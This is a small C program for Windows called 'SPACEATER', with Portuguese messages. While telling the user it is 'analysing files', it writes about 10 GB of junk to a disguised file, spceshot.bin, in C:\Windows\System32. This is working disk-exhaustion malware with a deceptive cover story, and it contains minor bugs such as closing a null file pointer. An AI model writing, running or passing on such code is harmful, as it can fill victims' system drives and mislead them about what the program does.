#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define GB 10

char choice;
FILE*fp;
FILE*c;
long long int total_kb = 0;
int total_mb = 0;
char esc[10];

long long int buffer = 1024LL*1024*1024;
	
void initiate(){
    printf("-- INICIAR PROGRAMA? (s/n) -- : ");
	scanf("%s", esc);
    
    if(strcmp(esc, "s") == 0){
        printf("\n\n-- INICIANDO --\n\n");
        sleep(1);
    }
    else{
    	printf("-- SAINDO --");
    	exit(0);
	}

}

void rootfinder(){
    fp = fopen("C:\\Windows\\explorer.exe", "rb");

    if (fp == NULL){
        printf("-- ANALISANDO --\n");
        sleep(1);
        printf("-- IMPOSSIVEL CONTINUAR --");
        fclose(fp);
    }

    else{
        c = fopen("C:\\Windows\\System32\\spceshot.bin", "wb+");
        if(c != NULL){
            printf("-- ARQUIVO CRIADO!! --\n\n");
            sleep(1);
            printf("-- ANALISANDO ARQUIVOS, AGUARDE... \n\n-- ISSO PODE DEMORAR ALGUNS MINUTOS.... --\n\n");
            sleep(1);
            
            char *data = (char*)malloc(buffer);        

            if(data == NULL){
                printf("-- ERRO --\n\n");
                exit(0);
            }
			
		
			while(total_mb < GB){
            	fwrite(data, sizeof(char), buffer, c);
            	total_kb += buffer;
                total_mb++;
        	}	
		
			if(total_mb == GB){
                printf("TERMINADO....");
                getchar();
            }
				

            free(data);
            fclose(c);
		} 
    }
}


int main(){
	printf("--- SPACEATER ---\n\n");
	initiate();
    sleep(2);
    rootfinder();
}


